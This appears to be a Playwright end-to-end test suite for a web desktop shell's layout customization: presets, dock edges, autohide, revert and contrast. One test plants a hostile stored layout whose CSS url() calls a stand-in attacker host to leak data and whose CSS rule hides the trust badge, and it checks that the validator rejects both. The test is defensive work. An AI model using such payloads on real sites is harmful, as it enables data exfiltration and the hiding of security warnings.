/**
 * desktop-layout.e2e.ts — the customization model, driven in a real browser.
 *
 * Every preset and every dock position is applied through the REAL Settings UI
 * (not by writing localStorage), at phone, tablet and desktop widths, and the
 * result is measured in composited pixels. This suite exists because this
 * project has a documented history of visual defects surviving every green
 * check: a layout that "applies" is not the same as a layout that is usable,
 * and only the second one can be measured off a bounding box.
 *
 * What it holds the model to, at every width:
 *   1. the dock is on screen, inside the viewport, and does not cover the menu
 *      bar — which carries the trust badge and the clock;
 *   2. nothing widens the document (a horizontal scrollbar across the OS);
 *   3. the trust chrome is still there and still reachable;
 *   4. the way back to stock works, including from a layout that hid the dock;
 *   5. a hostile layout in storage applies NOTHING.
 *
 * Screenshots are written to e2e-shots/ so a human (or the agent that wrote
 * this) can look at the actual image rather than trust the assertions.
 */
import { test, expect, type Page } from '@playwright/test'
import { installBackend } from './mock-backend.js'
import { belowAA, textNodeCount } from './contrast-scan'
import { mkdirSync } from 'node:fs'

// Under Playwright's own output directory, which .gitignore already covers.
// A spec that writes into a fresh top-level folder leaves a dirty tree for
// whoever commits next — and in this repo that is five other agents.
const SHOTS = 'test-results/desktop-layout'
mkdirSync(SHOTS, { recursive: true })

const DESKTOP = { width: 1280, height: 800 }
const TABLET_SM = { width: 768, height: 1024 }
const TABLET_LG = { width: 834, height: 1194 }
const PHONE = { width: 390, height: 844 }

/** Every preset id shipped in src/desktop/presets.ts, with its expected geometry. */
const PRESETS = [
  { id: 'vulos', label: 'Vulos', edge: 'bottom', style: 'floating', controls: 'left', mobileEdge: 'bottom' },
  { id: 'taskbar', label: 'Taskbar', edge: 'bottom', style: 'bar', controls: 'right', mobileEdge: 'bottom' },
  { id: 'menubar-dock', label: 'Menu bar and dock', edge: 'bottom', style: 'floating', controls: 'left', mobileEdge: 'bottom' },
  { id: 'side-dock', label: 'Side dock', edge: 'left', style: 'bar', controls: 'right', mobileEdge: 'bottom' },
] as const

async function boot(page: Page, opts: { theme?: 'dark' | 'light'; viewport?: { width: number; height: number } } = {}) {
  const theme = opts.theme ?? 'dark'
  await page.setViewportSize(opts.viewport ?? DESKTOP)
  await page.addInitScript((t) => {
    try { localStorage.setItem('vulos-theme', t as string) } catch { /* private mode */ }
  }, theme)
  await installBackend(page)
  await page.goto('/')
  await expect(page.getByTitle('Applications')).toBeVisible({ timeout: 25_000 })
  await page.evaluate((t) => { document.documentElement.setAttribute('data-theme', t) }, theme)
}

/** Launch a builtin through the ⌘K palette — the same lane the dock's launcher uses. */
async function launch(page: Page, appName: string) {
  const input = page.getByPlaceholder(/Search apps/)
  await expect(async () => {
    await page.keyboard.press('Meta+k')
    await expect(input).toBeVisible({ timeout: 1000 })
  }).toPass({ timeout: 15_000 })
  await input.fill(appName)
  await expect(page.getByText(appName, { exact: true }).first()).toBeVisible()
  await page.keyboard.press('Enter')
}

/** Open Settings → Appearance, where the desktop-layout controls live. */
async function openAppearance(page: Page) {
  await launch(page, 'Settings')
  const appearance = page.getByRole('button', { name: 'Appearance', exact: true })
  await expect(appearance.first()).toBeVisible({ timeout: 15_000 })
  await appearance.first().click()
  await expect(page.getByRole('radiogroup', { name: 'Desktop layout preset' })).toBeVisible({ timeout: 15_000 })
}

async function closeSettings(page: Page) {
  await page.getByRole('button', { name: 'Close window' }).last().click()
  await expect(page.getByRole('radiogroup', { name: 'Desktop layout preset' })).toHaveCount(0)
}

async function applyPresetViaUi(page: Page, label: string) {
  await openAppearance(page)
  await page.getByRole('radio', { name: new RegExp(`^${label}`) }).click()
  await closeSettings(page)
}

/** No element may push the document wider than the viewport. */
async function assertNoHorizontalOverflow(page: Page) {
  const o = await page.evaluate(() => ({
    doc: document.documentElement.scrollWidth,
    body: document.body.scrollWidth,
    inner: window.innerWidth,
  }))
  expect(o.doc, `document scrollWidth ${o.doc} > innerWidth ${o.inner}`).toBeLessThanOrEqual(o.inner + 1)
  expect(o.body).toBeLessThanOrEqual(o.inner + 1)
}

/**
 * The dock must be on screen, inside the viewport, and clear of the menu bar.
 *
 * "Clear of the menu bar" is the assertion that matters most: the bar holds the
 * TrustBadge and the exposure chip, and chrome that can cover it is chrome that
 * can hide a live warning.
 */
async function assertDockUsable(page: Page) {
  const dock = page.getByRole('toolbar', { name: 'Dock' })
  await expect(dock).toBeVisible()
  const box = await dock.boundingBox()
  if (!box) throw new Error('dock has no bounding box')
  const vp = page.viewportSize()!
  expect(box.width, 'dock has no width').toBeGreaterThan(24)
  expect(box.height, 'dock has no height').toBeGreaterThan(24)
  expect(box.x, 'dock starts left of the viewport').toBeGreaterThanOrEqual(-1)
  expect(box.y, 'dock starts above the viewport').toBeGreaterThanOrEqual(-1)
  expect(box.x + box.width, 'dock runs off the right edge').toBeLessThanOrEqual(vp.width + 1)
  expect(box.y + box.height, 'dock runs off the bottom edge').toBeLessThanOrEqual(vp.height + 1)

  const barBottom = await page.evaluate(() => {
    const bar = document.querySelector('.vshell-bar')
    return bar ? bar.getBoundingClientRect().bottom : 0
  })
  expect(box.y + 1, `dock top ${box.y} overlaps the menu bar (bottom ${barBottom})`).toBeGreaterThanOrEqual(barBottom)

  // Every tile is a real target at every size the model allows.
  const first = dock.locator('.vshell-dock-item').first()
  const tile = await first.boundingBox()
  if (!tile) throw new Error('first dock item has no bounding box')
  expect(Math.min(tile.width, tile.height), 'dock tile is smaller than the WCAG 2.5.8 target').toBeGreaterThanOrEqual(24)

  // The dock must not land on the ambient widget column. A right-edge dock did
  // exactly that at 768px — it sat across the world clock — and every
  // assertion above was green while the screenshot showed it.
  const widgets = page.locator('[data-desktop-widgets]')
  if (await widgets.count()) {
    const w = await widgets.boundingBox()
    if (w) {
      const overlaps = box.x < w.x + w.width && w.x < box.x + box.width
        && box.y < w.y + w.height && w.y < box.y + box.height
      expect(overlaps, `dock ${JSON.stringify(box)} overlaps the widget column ${JSON.stringify(w)}`).toBe(false)
    }
  }
}

/** The shell's security chrome is present and clickable. */
async function assertTrustChromeIntact(page: Page) {
  const badge = page.getByRole('button', { name: 'Sovereignty and privacy status' })
  await expect(badge).toBeVisible()
  const box = await badge.boundingBox()
  if (!box) throw new Error('trust badge has no bounding box')
  expect(box.width).toBeGreaterThan(8)
  expect(box.height).toBeGreaterThan(8)
  // Nothing is painted over it: the element at its centre is the badge itself.
  const onTop = await page.evaluate(([x, y]) => {
    const el = document.elementFromPoint(x as number, y as number)
    return !!el?.closest('[aria-label="Sovereignty and privacy status"]')
  }, [box.x + box.width / 2, box.y + box.height / 2])
  expect(onTop, 'something is painted over the trust badge').toBe(true)
}

/* ── Presets, at every width ──────────────────────────────────────────────── */

for (const preset of PRESETS) {
  test(`preset "${preset.label}" is usable at desktop, tablet and phone widths`, async ({ page }) => {
    const errors: string[] = []
    page.on('pageerror', (e) => errors.push(e.message))

    await boot(page)
    await applyPresetViaUi(page, preset.label)

    const root = page.locator('html')
    await expect(root).toHaveAttribute('data-desktop-preset', preset.id)
    await expect(root).toHaveAttribute('data-dock-edge', preset.edge)
    await expect(root).toHaveAttribute('data-dock-style', preset.style)
    await expect(root).toHaveAttribute('data-window-controls', preset.controls)

    for (const [name, vp] of [['desktop', DESKTOP], ['tablet-768', TABLET_SM], ['tablet-834', TABLET_LG]] as const) {
      await page.setViewportSize(vp)
      await page.waitForTimeout(400)
      await assertDockUsable(page)
      await assertTrustChromeIntact(page)
      await assertNoHorizontalOverflow(page)
      await page.screenshot({ path: `${SHOTS}/${preset.id}-${name}.png` })
    }

    // Phone: below 768px the shell hands over to MobileStack, and the MOBILE
    // dock profile is what must be in effect — a preset that is beautiful at
    // 1280px and vertical at 390px is a broken preset, not a preference.
    await page.setViewportSize(PHONE)
    await page.reload()
    await expect(page.locator('nav[aria-label="System navigation"]')).toBeVisible({ timeout: 25_000 })
    await expect(root).toHaveAttribute('data-dock-edge', preset.mobileEdge)
    await assertNoHorizontalOverflow(page)
    await page.screenshot({ path: `${SHOTS}/${preset.id}-phone.png` })

    expect(errors, `uncaught page errors: ${errors.join(' | ')}`).toEqual([])
  })
}

/* ── Dock positions ───────────────────────────────────────────────────────── */

for (const edge of ['Bottom', 'Top', 'Left', 'Right'] as const) {
  test(`the dock is usable on the ${edge.toLowerCase()} edge at 1280, 834 and 768`, async ({ page }) => {
    await boot(page)
    await openAppearance(page)
    await page.getByRole('radiogroup', { name: 'Position' }).first().getByRole('radio', { name: edge }).click()
    await closeSettings(page)

    await expect(page.locator('html')).toHaveAttribute('data-dock-edge', edge.toLowerCase())

    for (const [name, vp] of [['1280', DESKTOP], ['834', TABLET_LG], ['768', TABLET_SM]] as const) {
      await page.setViewportSize(vp)
      await page.waitForTimeout(350)
      await assertDockUsable(page)
      await assertTrustChromeIntact(page)
      await assertNoHorizontalOverflow(page)
      await page.screenshot({ path: `${SHOTS}/edge-${edge.toLowerCase()}-${name}.png` })
    }
  })
}

test('a full dock at 768px scrolls instead of widening the document', async ({ page }) => {
  await boot(page, { viewport: TABLET_SM })
  await openAppearance(page)
  // Largest tiles + a full-span bar is the worst case the model can produce.
  await page.getByRole('radiogroup', { name: 'Size' }).first().getByRole('radio', { name: 'Large' }).click()
  await page.getByRole('radiogroup', { name: 'Style' }).getByRole('radio', { name: 'Bar' }).click()
  await closeSettings(page)

  // Open several apps so the strip carries running-not-pinned tiles too.
  for (const app of ['Terminal', 'Files', 'Activity Monitor']) {
    await launch(page, app)
    await page.waitForTimeout(250)
  }

  await assertDockUsable(page)
  await assertNoHorizontalOverflow(page)
  await page.screenshot({ path: `${SHOTS}/full-dock-768.png` })
})

/* ── Autohide ─────────────────────────────────────────────────────────────── */

test('an autohidden dock hides, reveals on hover, and is still reachable by keyboard', async ({ page }) => {
  await boot(page)
  await openAppearance(page)
  await page.getByRole('switch', { name: 'Hide until pointed at' }).click()
  await closeSettings(page)

  const dock = page.getByRole('toolbar', { name: 'Dock' })
  await page.waitForTimeout(500)
  const vp = page.viewportSize()!

  const hidden = await dock.boundingBox()
  if (!hidden) throw new Error('an autohidden dock must stay in the DOM')
  // Slid off its edge: only the reveal lip is on screen.
  expect(hidden.y, 'autohidden dock is still fully on screen').toBeGreaterThan(vp.height - 24)
  await page.screenshot({ path: `${SHOTS}/autohide-hidden.png` })

  await dock.hover({ position: { x: 40, y: 2 } })
  await page.waitForTimeout(500)
  const shown = await dock.boundingBox()
  if (!shown) throw new Error('dock vanished on hover')
  expect(shown.y, 'dock did not reveal on hover').toBeLessThan(vp.height - 40)
  await page.screenshot({ path: `${SHOTS}/autohide-revealed.png` })

  // Keyboard: focusing anything inside must reveal it. A dock you cannot reach
  // without a pointer is a trap, not a preference.
  await page.mouse.move(vp.width / 2, 100)
  await page.waitForTimeout(400)
  await dock.locator('button').first().focus()
  await page.waitForTimeout(400)
  const focused = await dock.boundingBox()
  if (!focused) throw new Error('dock vanished on focus')
  expect(focused.y, 'dock did not reveal on keyboard focus').toBeLessThan(vp.height - 40)
})

/* ── Revert ───────────────────────────────────────────────────────────────── */

test('one action returns a heavily customized desktop to stock', async ({ page }) => {
  await boot(page)
  await applyPresetViaUi(page, 'Side dock')
  await openAppearance(page)
  await page.getByRole('switch', { name: 'Hide until pointed at' }).click()
  await page.getByRole('radiogroup', { name: 'Size' }).first().getByRole('radio', { name: 'Small' }).click()
  await closeSettings(page)

  const root = page.locator('html')
  await expect(root).toHaveAttribute('data-dock-edge', 'left')
  await expect(root).toHaveAttribute('data-dock-autohide', 'on')
  await page.screenshot({ path: `${SHOTS}/revert-before.png` })

  // The hotkey, not the button — this is the route that has to work when the
  // layout has made the button hard to find.
  await page.keyboard.press('Control+Alt+Shift+Backspace')
  await page.waitForTimeout(400)

  await expect(root).toHaveAttribute('data-desktop-preset', 'vulos')
  await expect(root).toHaveAttribute('data-dock-edge', 'bottom')
  await expect(root).toHaveAttribute('data-dock-autohide', 'off')
  await expect(root).toHaveAttribute('data-window-controls', 'left')
  await assertDockUsable(page)
  await page.screenshot({ path: `${SHOTS}/revert-after.png` })

  // And it survives a reload: revert removes the persisted key rather than
  // overwriting it, so there is nothing left to come back.
  await page.reload()
  await expect(page.getByTitle('Applications')).toBeVisible({ timeout: 25_000 })
  await expect(root).toHaveAttribute('data-desktop-preset', 'vulos')
})

test('the ?desktop-layout=stock escape hatch works without a keyboard', async ({ page }) => {
  await boot(page)
  await applyPresetViaUi(page, 'Side dock')
  await expect(page.locator('html')).toHaveAttribute('data-dock-edge', 'left')

  await page.goto('/?desktop-layout=stock')
  await expect(page.getByTitle('Applications')).toBeVisible({ timeout: 25_000 })
  await expect(page.locator('html')).toHaveAttribute('data-dock-edge', 'bottom')
  await expect(page.locator('html')).toHaveAttribute('data-desktop-preset', 'vulos')
})

/* ── The security boundary, in the browser ────────────────────────────────── */

test('a hostile layout in storage applies nothing and leaves the trust chrome intact', async ({ page }) => {
  // Two attacks in one payload: a remote url() (the CSS exfiltration channel)
  // and an attempt to reach the shell's own surface tokens, which is how a
  // theme would repaint or hide the trust badge. Both are rejected by
  // validateLayout on READ, so the shell boots stock.
  await page.addInitScript(() => {
    try {
      localStorage.setItem('vulos.desktop.layout', JSON.stringify({
        presetId: 'evil',
        dock: {
          desktop: { edge: 'bottom', size: 'medium', style: 'bar', align: 'center', autohide: true, launcher: true, assistant: true, drawer: false, items: [] },
          mobile: { edge: 'bottom', size: 'large', style: 'bar', align: 'center', autohide: false, launcher: false, assistant: true, drawer: true, items: [] },
        },
        windowControls: 'left',
        tokens: {
          '--bg-elevated': 'url(https://attacker.example/leak)',
          '--vd-dock-opacity': '0',
        },
        css: '[aria-label="Sovereignty and privacy status"]{display:none!important}',
      }))
    } catch { /* private mode */ }
  })
  await boot(page)

  const root = page.locator('html')
  await expect(root).toHaveAttribute('data-desktop-preset', 'vulos')
  await expect(root).toHaveAttribute('data-dock-autohide', 'off')

  // No property from the payload reached the document, and the dock is opaque.
  const leaked = await page.evaluate(() => ({
    bgElevated: document.documentElement.style.getPropertyValue('--bg-elevated'),
    dockOpacity: document.documentElement.style.getPropertyValue('--vd-dock-opacity'),
    styleAttr: document.documentElement.getAttribute('style') || '',
  }))
  expect(leaked.bgElevated).toBe('')
  expect(leaked.dockOpacity).toBe('')
  expect(leaked.styleAttr).not.toContain('url(')

  await assertTrustChromeIntact(page)
  await assertDockUsable(page)
  await page.screenshot({ path: `${SHOTS}/hostile-rejected.png` })
})

/* ── Contrast, on both themes, for every preset ───────────────────────────── */

for (const theme of ['dark', 'light'] as const) {
  test(`every preset passes composited contrast on the ${theme} theme`, async ({ page }) => {
    await boot(page, { theme })
    for (const preset of PRESETS) {
      await applyPresetViaUi(page, preset.label)
      await page.waitForTimeout(900)
      const measured = await textNodeCount(page)
      // A screen that failed to render must not pass by measuring nothing.
      expect(measured, `${preset.id}/${theme} rendered almost no text`).toBeGreaterThan(12)
      const failures = await belowAA(page)
      expect(failures, `${preset.id} on ${theme}:\n${failures.join('\n')}`).toEqual([])
      await page.screenshot({ path: `${SHOTS}/contrast-${preset.id}-${theme}.png` })
    }
  })
}
